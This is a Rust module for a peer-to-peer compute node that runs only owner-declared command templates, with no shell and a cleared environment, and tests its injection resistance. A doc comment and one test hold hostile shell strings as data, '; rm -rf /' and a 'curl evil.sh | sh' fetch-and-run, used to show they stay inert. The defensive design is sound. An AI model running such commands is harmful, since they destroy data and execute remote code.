//! Declared tasks: the work a machine's owner has agreed it will run.
//!
//! A task is a command template written into this node's own `config.json`.
//! A remote node names one and supplies values for its placeholders; it cannot
//! invent work, choose the program, add arguments, or reach a shell.
//!
//! ```json
//! "tasks": {
//!   "render": {
//!     "command": "blender",
//!     "args": ["-b", "{scene}", "-o", "{output}", "-f", "{frame}"],
//!     "description": "Render one Blender frame",
//!     "needs_gpu": true
//!   }
//! }
//! ```
//!
//! # Why templates, not commands
//!
//! The obvious design — let a peer send a command line — is a remote code
//! execution service on your LAN. Any device that reaches the port, or any
//! device later compromised, would own every machine that trusted it. Here the
//! program is fixed by the owner and every substituted value becomes exactly
//! one `argv` entry, so a parameter containing `; rm -rf /` is passed to the
//! program as that literal string and cannot become a second command. There is
//! no shell anywhere in this file.

use std::collections::HashMap;
use std::process::Stdio;
use std::sync::Arc;

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::sync::{mpsc, RwLock};

use crate::compute::protocol::{TaskInfo, MAX_JOB_OUTPUT_BYTES};

/// A task the owner has declared.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct TaskDefinition {
    /// The program to run. Resolved on `PATH`, never interpreted by a shell.
    pub command: String,
    /// Arguments, with `{name}` placeholders filled from the request.
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub description: String,
    /// Working directory. The node's data directory when absent.
    #[serde(default)]
    pub working_dir: Option<String>,
    /// Advertised so work needing a GPU can be routed to a machine with one.
    #[serde(default)]
    pub needs_gpu: bool,
    /// Kill the job after this many seconds.
    #[serde(default = "default_timeout")]
    pub timeout_secs: u64,
}

fn default_timeout() -> u64 {
    3600
}

impl TaskDefinition {
    /// Placeholder names this task expects.
    pub fn parameters(&self) -> Vec<String> {
        let mut names = Vec::new();
        for arg in &self.args {
            let mut rest = arg.as_str();
            while let Some(start) = rest.find('{') {
                let Some(end) = rest[start..].find('}') else {
                    break;
                };
                let name = &rest[start + 1..start + end];
                if !name.is_empty() && !names.contains(&name.to_string()) {
                    names.push(name.to_string());
                }
                rest = &rest[start + end + 1..];
            }
        }
        names
    }

    pub fn describe(&self, name: &str) -> TaskInfo {
        TaskInfo {
            name: name.to_string(),
            description: self.description.clone(),
            parameters: self.parameters(),
            needs_gpu: self.needs_gpu,
        }
    }

    /// Build the argument list for a request.
    ///
    /// Every placeholder must be supplied, and each substituted value stays
    /// inside the single `argv` entry it appeared in — the substitution is
    /// textual within one argument, never a re-split of the command line.
    pub fn resolve_args(&self, parameters: &HashMap<String, String>) -> Result<Vec<String>> {
        let expected = self.parameters();
        for name in &expected {
            if !parameters.contains_key(name) {
                bail!("missing parameter \"{name}\"");
            }
        }

        // Refusing unknown parameters keeps a typo from silently doing nothing
        // and makes the contract exact.
        for name in parameters.keys() {
            if !expected.contains(name) {
                bail!("unexpected parameter \"{name}\"");
            }
        }

        let mut resolved = Vec::with_capacity(self.args.len());
        for arg in &self.args {
            let mut value = arg.clone();
            for (name, supplied) in parameters {
                validate_value(name, supplied)?;
                value = value.replace(&format!("{{{name}}}"), supplied);
            }
            resolved.push(value);
        }
        Ok(resolved)
    }
}

/// Reject values that would be dangerous even as a single argument.
///
/// Shell metacharacters cannot escape an `argv` entry, so they are allowed —
/// a filename may legitimately contain a semicolon. What is refused is what
/// stays dangerous without a shell: NUL bytes, which truncate the string the
/// operating system actually receives, and newlines, which corrupt any
/// line-oriented protocol the task itself might speak.
fn validate_value(name: &str, value: &str) -> Result<()> {
    if value.len() > 4096 {
        bail!("parameter \"{name}\" is too long");
    }
    if value.contains('\0') {
        bail!("parameter \"{name}\" contains a NUL byte");
    }
    if value.contains('\n') || value.contains('\r') {
        bail!("parameter \"{name}\" contains a line break");
    }
    Ok(())
}

/// One line of output from a running job.
#[derive(Debug, Clone)]
pub enum JobEvent {
    Output(String),
    Finished {
        exit_code: Option<i32>,
        error: Option<String>,
    },
}

/// Every task this node will run.
#[derive(Clone, Default)]
pub struct TaskRegistry {
    tasks: Arc<RwLock<HashMap<String, TaskDefinition>>>,
    /// Where a task runs when it declares no directory of its own.
    default_dir: Arc<RwLock<Option<std::path::PathBuf>>>,
}

impl std::fmt::Debug for TaskRegistry {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("TaskRegistry").finish_non_exhaustive()
    }
}

impl TaskRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Replace the declared tasks, e.g. after the config is reloaded.
    pub async fn set(
        &self,
        tasks: HashMap<String, TaskDefinition>,
        default_dir: Option<std::path::PathBuf>,
    ) {
        *self.tasks.write().await = tasks;
        *self.default_dir.write().await = default_dir;
    }

    pub async fn get(&self, name: &str) -> Option<TaskDefinition> {
        self.tasks.read().await.get(name).cloned()
    }

    /// What to advertise, sorted so the list is stable between beacons.
    pub async fn describe(&self) -> Vec<TaskInfo> {
        let tasks = self.tasks.read().await;
        let mut described: Vec<TaskInfo> = tasks
            .iter()
            .map(|(name, task)| task.describe(name))
            .collect();
        described.sort_by(|a, b| a.name.cmp(&b.name));
        described
    }

    pub async fn is_empty(&self) -> bool {
        self.tasks.read().await.is_empty()
    }

    /// Run a task, streaming its output.
    ///
    /// Output is read line by line so a long job reports progress as it goes
    /// rather than only when it ends.
    pub async fn run(
        &self,
        name: &str,
        parameters: &HashMap<String, String>,
        events: mpsc::Sender<JobEvent>,
    ) -> Result<()> {
        let task = self
            .get(name)
            .await
            .with_context(|| format!("this node does not offer a task called \"{name}\""))?;

        let args = task.resolve_args(parameters)?;
        let working_dir = match &task.working_dir {
            Some(dir) => Some(std::path::PathBuf::from(dir)),
            None => self.default_dir.read().await.clone(),
        };

        tracing::info!(task = %name, command = %task.command, "running a shared task");

        let mut command = Command::new(&task.command);
        command
            .args(&args)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            // The environment is not inherited wholesale: a task running on
            // behalf of a peer has no business seeing this machine's secrets.
            .env_clear()
            .env("PATH", std::env::var("PATH").unwrap_or_default());

        if let Some(dir) = &working_dir {
            let _ = tokio::fs::create_dir_all(dir).await;
            command.current_dir(dir);
        }

        #[cfg(windows)]
        {
            // Never flash a console window on a machine someone is using.
            const CREATE_NO_WINDOW: u32 = 0x0800_0000;
            command.creation_flags(CREATE_NO_WINDOW);
        }

        let mut child = command
            .spawn()
            .with_context(|| format!("could not start \"{}\"", task.command))?;

        let stdout = child.stdout.take();
        let stderr = child.stderr.take();
        let mut sent_bytes = 0usize;

        // Merge both streams: a task's diagnostics are usually on stderr, and
        // the requester wants to see them interleaved as they happen.
        let mut lines = Vec::new();
        if let Some(stdout) = stdout {
            lines.push(BufReader::new(stdout).lines());
        }
        let mut error_lines = stderr.map(|s| BufReader::new(s).lines());

        let deadline = tokio::time::Instant::now()
            + std::time::Duration::from_secs(task.timeout_secs.clamp(1, 86_400));

        loop {
            let mut produced = false;

            for reader in &mut lines {
                if let Ok(Some(line)) = reader.next_line().await {
                    produced = true;
                    if sent_bytes + line.len() <= MAX_JOB_OUTPUT_BYTES {
                        sent_bytes += line.len();
                        let _ = events.send(JobEvent::Output(line)).await;
                    }
                }
            }

            if let Some(reader) = &mut error_lines {
                if let Ok(Some(line)) = reader.next_line().await {
                    produced = true;
                    if sent_bytes + line.len() <= MAX_JOB_OUTPUT_BYTES {
                        sent_bytes += line.len();
                        let _ = events.send(JobEvent::Output(line)).await;
                    }
                }
            }

            match child.try_wait() {
                Ok(Some(status)) if !produced => {
                    let _ = events
                        .send(JobEvent::Finished {
                            exit_code: status.code(),
                            error: (!status.success())
                                .then(|| format!("exited with status {status}")),
                        })
                        .await;
                    return Ok(());
                }
                Ok(_) => {}
                Err(e) => {
                    let _ = events
                        .send(JobEvent::Finished {
                            exit_code: None,
                            error: Some(e.to_string()),
                        })
                        .await;
                    return Ok(());
                }
            }

            if tokio::time::Instant::now() > deadline {
                let _ = child.kill().await;
                let _ = events
                    .send(JobEvent::Finished {
                        exit_code: None,
                        error: Some(format!("timed out after {}s", task.timeout_secs)),
                    })
                    .await;
                return Ok(());
            }

            if !produced {
                tokio::time::sleep(std::time::Duration::from_millis(40)).await;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn render_task() -> TaskDefinition {
        TaskDefinition {
            command: "blender".into(),
            args: vec![
                "-b".into(),
                "{scene}".into(),
                "-o".into(),
                "{output}".into(),
            ],
            description: "Render a scene".into(),
            working_dir: None,
            needs_gpu: true,
            timeout_secs: 3600,
        }
    }

    #[test]
    fn placeholders_are_discovered_from_the_template() {
        assert_eq!(render_task().parameters(), vec!["scene", "output"]);

        // A repeated placeholder is listed once.
        let repeated = TaskDefinition {
            args: vec!["{file}".into(), "--also".into(), "{file}".into()],
            ..render_task()
        };
        assert_eq!(repeated.parameters(), vec!["file"]);

        let none = TaskDefinition {
            args: vec!["--version".into()],
            ..render_task()
        };
        assert!(none.parameters().is_empty());
    }

    #[test]
    fn every_placeholder_must_be_supplied_and_no_others() {
        let task = render_task();

        let missing = HashMap::from([("scene".to_string(), "a.blend".to_string())]);
        assert!(task
            .resolve_args(&missing)
            .unwrap_err()
            .to_string()
            .contains("output"));

        let extra = HashMap::from([
            ("scene".to_string(), "a.blend".to_string()),
            ("output".to_string(), "out/".to_string()),
            ("surprise".to_string(), "x".to_string()),
        ]);
        assert!(task
            .resolve_args(&extra)
            .unwrap_err()
            .to_string()
            .contains("unexpected"));
    }

    #[test]
    fn a_hostile_value_stays_one_argument() {
        // The point of the whole design: shell metacharacters are harmless
        // because there is no shell, and the value must not split into more
        // arguments than the template declared.
        let task = render_task();
        let parameters = HashMap::from([
            ("scene".to_string(), "; rm -rf / #".to_string()),
            (
                "output".to_string(),
                "$(whoami) && curl evil.sh | sh".to_string(),
            ),
        ]);

        let args = task.resolve_args(&parameters).unwrap();
        assert_eq!(
            args.len(),
            4,
            "argument count must match the template exactly"
        );
        assert_eq!(args[1], "; rm -rf / #");
        assert_eq!(args[3], "$(whoami) && curl evil.sh | sh");
    }

    #[test]
    fn values_that_are_dangerous_without_a_shell_are_refused() {
        let task = render_task();

        for hostile in ["a\0b", "line\nbreak", "carriage\rreturn"] {
            let parameters = HashMap::from([
                ("scene".to_string(), hostile.to_string()),
                ("output".to_string(), "out/".to_string()),
            ]);
            assert!(
                task.resolve_args(&parameters).is_err(),
                "{hostile:?} should have been refused"
            );
        }

        let long = HashMap::from([
            ("scene".to_string(), "x".repeat(5000)),
            ("output".to_string(), "out/".to_string()),
        ]);
        assert!(task.resolve_args(&long).is_err());
    }

    #[tokio::test]
    async fn an_undeclared_task_is_refused() {
        let registry = TaskRegistry::new();
        registry
            .set(HashMap::from([("render".to_string(), render_task())]), None)
            .await;

        let (tx, _rx) = mpsc::channel(8);
        let error = registry
            .run("definitely-not-declared", &HashMap::new(), tx)
            .await
            .unwrap_err();
        assert!(error.to_string().contains("does not offer"));
    }

    #[tokio::test]
    async fn a_declared_task_runs_and_streams_its_output() {
        let registry = TaskRegistry::new();

        // Echo something back through a program every platform has.
        let (command, args) = if cfg!(windows) {
            (
                "cmd".to_string(),
                vec![
                    "/C".to_string(),
                    "echo".to_string(),
                    "{message}".to_string(),
                ],
            )
        } else {
            ("echo".to_string(), vec!["{message}".to_string()])
        };

        registry
            .set(
                HashMap::from([(
                    "say".to_string(),
                    TaskDefinition {
                        command,
                        args,
                        description: "Say something".into(),
                        working_dir: None,
                        needs_gpu: false,
                        timeout_secs: 30,
                    },
                )]),
                None,
            )
            .await;

        let (tx, mut rx) = mpsc::channel(32);
        let parameters = HashMap::from([("message".to_string(), "hello from a peer".to_string())]);
        registry.run("say", &parameters, tx).await.unwrap();

        let mut output = String::new();
        let mut finished = false;
        while let Some(event) = rx.recv().await {
            match event {
                JobEvent::Output(line) => output.push_str(&line),
                JobEvent::Finished { exit_code, .. } => {
                    assert_eq!(exit_code, Some(0));
                    finished = true;
                    break;
                }
            }
        }

        assert!(finished, "the job should have reported completion");
        assert!(output.contains("hello from a peer"), "got: {output}");
    }

    #[tokio::test]
    async fn describe_lists_tasks_in_a_stable_order() {
        let registry = TaskRegistry::new();
        registry
            .set(
                HashMap::from([
                    ("render".to_string(), render_task()),
                    ("encode".to_string(), render_task()),
                ]),
                None,
            )
            .await;

        let described = registry.describe().await;
        assert_eq!(
            described
                .iter()
                .map(|t| t.name.as_str())
                .collect::<Vec<_>>(),
            ["encode", "render"]
        );
    }
}
